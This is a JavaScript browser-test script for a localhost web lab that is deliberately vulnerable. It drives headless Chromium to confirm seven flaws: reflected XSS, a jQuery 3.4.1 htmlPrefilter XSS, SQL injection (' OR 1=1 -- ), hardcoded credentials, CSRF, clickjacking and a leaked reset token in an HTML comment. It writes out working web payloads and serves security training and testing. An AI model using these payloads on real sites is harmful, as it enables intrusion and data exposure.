// Real-browser checks for the deliberately vulnerable localhost lab.
// Node 22+ and Edge/Chromium; no external requests or real credentials.
const assert = require('node:assert/strict');
const {spawn, spawnSync} = require('node:child_process');
const {mkdtempSync, existsSync} = require('node:fs');
const {tmpdir} = require('node:os');
const path = require('node:path');
const net = require('node:net');

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
async function port() {
  const server = net.createServer();
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  const value = server.address().port;
  await new Promise(resolve => server.close(resolve));
  return value;
}
async function until(check, timeout = 15000) {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    try { const result = await check(); if (result) return result; } catch (_) {}
    await delay(100);
  }
  throw new Error('Timed out waiting for browser condition');
}
async function main() {
  const browserPath = process.env.BROWSER_PATH || 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe';
  assert.ok(existsSync(browserPath), 'Set BROWSER_PATH to a Chromium browser executable.');
  const appPort = await port();
  let attackerPort = await port();
  while (attackerPort === appPort) attackerPort = await port();
  const debugPort = await port();
  const repoRoot = path.resolve(__dirname, '../..');
  const targetOrigin = `http://127.0.0.1:${appPort}`;
  const attackerOrigin = `http://127.0.0.1:${attackerPort}`;
  const python = process.platform === 'win32' ? '.venv/Scripts/python.exe' : '.venv/bin/python';
  const server = spawn(python, [path.join(__dirname, 'app.py'), '--port', String(appPort), '--attacker-port', String(attackerPort)], {cwd: repoRoot, windowsHide: true, stdio: 'ignore'});
  let browser, ws;
  try {
    await until(async () => (await fetch(`http://127.0.0.1:${appPort}/`)).ok);
    const profile = mkdtempSync(path.join(tmpdir(), 'repository-browser-test-'));
    browser = spawn(browserPath, ['--headless=new', '--no-first-run', '--no-default-browser-check',
      '--disable-gpu', '--disable-extensions', '--disable-background-networking',
      `--user-data-dir=${profile}`, `--remote-debugging-port=${debugPort}`, 'about:blank'],
      {windowsHide: true, stdio: 'ignore'});
    const targets = await until(async () => (await fetch(`http://127.0.0.1:${debugPort}/json/list`)).json());
    const target = targets.find(value => value.type === 'page');
    ws = new WebSocket(target.webSocketDebuggerUrl);
    await new Promise((resolve, reject) => { ws.onopen = resolve; ws.onerror = reject; });
    let nextId = 0;
    const pending = new Map();
    ws.onmessage = event => {
      const value = JSON.parse(event.data);
      if (value.method === 'Runtime.exceptionThrown') console.error('Browser script error:', JSON.stringify(value.params));
      if (pending.has(value.id)) {
        const {resolve, reject, timer} = pending.get(value.id);
        clearTimeout(timer); pending.delete(value.id);
        value.error ? reject(new Error(JSON.stringify(value.error))) : resolve(value.result);
      }
    };
    function send(method, params = {}) {
      return new Promise((resolve, reject) => {
        const id = ++nextId;
        const timer = setTimeout(() => { pending.delete(id); reject(new Error(`CDP timeout: ${method}`)); }, 10000);
        pending.set(id, {resolve, reject, timer});
        ws.send(JSON.stringify({id, method, params}));
      });
    }
    async function evaluate(expression) {
      const result = await send('Runtime.evaluate', {expression, returnByValue: true, awaitPromise: true});
      if (result.exceptionDetails) throw new Error(JSON.stringify(result.exceptionDetails));
      return result.result.value;
    }
    await send('Runtime.enable');
    const navigation = await send('Page.navigate', {url: `http://127.0.0.1:${appPort}/`});
    assert.ok(!navigation.errorText, navigation.errorText);
    try {
      await until(() => evaluate(`document.title.includes('Deliberately vulnerable')`));
    } catch (error) {
      console.error(await evaluate(`JSON.stringify({url: location.href, body: document.body?.innerText.slice(0, 1500), ui: typeof window.RepositoryReviewUI})`));
      throw error;
    }
    async function navigate(url, condition) {
      const result = await send('Page.navigate', {url});
      assert.ok(!result.errorText, result.errorText);
      await until(() => evaluate(condition));
    }
    await navigate(targetOrigin + '/search?q=' + encodeURIComponent('<script>document.body.dataset.xss="executed"</script>'),
      `document.body?.dataset.xss === 'executed'`);
    console.log('PASS: reflected XSS executes JavaScript in the target origin.');
    const jqueryPayload = '<style><style/><img src=/missing-jquery-lab-image onerror="document.body.dataset.jqueryXss=\'executed\';document.querySelector(\'#result\').textContent=\'Payload executed\'">';
    await navigate(targetOrigin + '/jquery?fragment=' + encodeURIComponent(jqueryPayload),
      `document.body?.dataset.jqueryXss === 'executed'`);
    assert.equal(await evaluate(`jQuery.fn.jquery`), '3.4.1');
    console.log('PASS: jQuery 3.4.1 htmlPrefilter payload executes in the target origin.');
    await navigate(targetOrigin + '/login', `!!document.querySelector('input[name="password"]')`);
    await evaluate(`document.querySelector('input[name="username"]').value = 'admin';
      document.querySelector('input[name="password"]').value = 'LabOnly123!'; document.querySelector('form').requestSubmit()`);
    await until(() => evaluate(`location.pathname === '/account' && document.body.textContent.includes('Signed in as admin')`));
    console.log('PASS: hardcoded credentials authenticate.');
    await navigate(attackerOrigin + '/csrf', `!!document.querySelector('#csrf-submit')`);
    await evaluate(`document.querySelector('#csrf-submit').click()`);
    await until(() => evaluate(`location.port === '${appPort}' && document.querySelector('#email')?.textContent.includes('attacker@example.test')`));
    console.log('PASS: a cross-origin form changes the authenticated email using the browser cookie.');
    await evaluate(`(async () => { await fetch('/profile/reset', {method:'POST', body:''}); })()`);
    await navigate(attackerOrigin + '/clickjacking', `!!document.querySelector('.trap')`);
    await until(async () => {
      const tree = await send('Page.getFrameTree');
      return tree.frameTree.childFrames?.some(f => f.frame.url === targetOrigin + '/account?frame=1');
    });
    const point = await evaluate(`(() => { const r = document.querySelector('.trap').getBoundingClientRect(); return {x:r.x+r.width/2,y:r.y+r.height/2}; })()`);
    await send('Input.dispatchMouseEvent', {type:'mousePressed', ...point, button:'left', clickCount:1});
    await send('Input.dispatchMouseEvent', {type:'mouseReleased', ...point, button:'left', clickCount:1});
    await until(async () => {
      const tree = await send('Page.getFrameTree');
      return tree.frameTree.childFrames?.some(f => f.frame.url === targetOrigin + '/account');
    });
    await navigate(targetOrigin + '/account', `document.querySelector('#subscription')?.textContent.includes('enabled')`);
    console.log('PASS: clicking the decoy activates the framed newsletter action.');
    await navigate(targetOrigin + '/products?category=office', `!!document.querySelector('table')`);
    assert.equal(await evaluate(`document.body.textContent.includes('Unreleased demo product')`), false);
    await navigate(targetOrigin + '/products?category=' + encodeURIComponent("' OR 1=1 -- "),
      `document.body.textContent.includes('Unreleased demo product')`);
    console.log('PASS: SQL injection exposes the hidden product.');
    await navigate(targetOrigin, `document.title.includes('Deliberately vulnerable')`);
    assert.equal(await evaluate(`(async () => { const html=await (await fetch('/')).text(); return html.includes('<!-- VULN-06:') && html.includes('DEMO-RESET-TOKEN-DO-NOT-USE'); })()`), true);
    console.log('PASS: sensitive comments reach the browser. All seven cases verified.');
    await send('Browser.close').catch(() => {});
  } finally {
    if (ws) ws.close();
    if (browser) browser.kill();
    if (process.platform === 'win32' && server.pid) {
      spawnSync('taskkill.exe', ['/pid', String(server.pid), '/t', '/f'], {windowsHide:true, stdio:'ignore'});
    } else server.kill();
  }
}
main().catch(error => { console.error(error); process.exitCode = 1; });
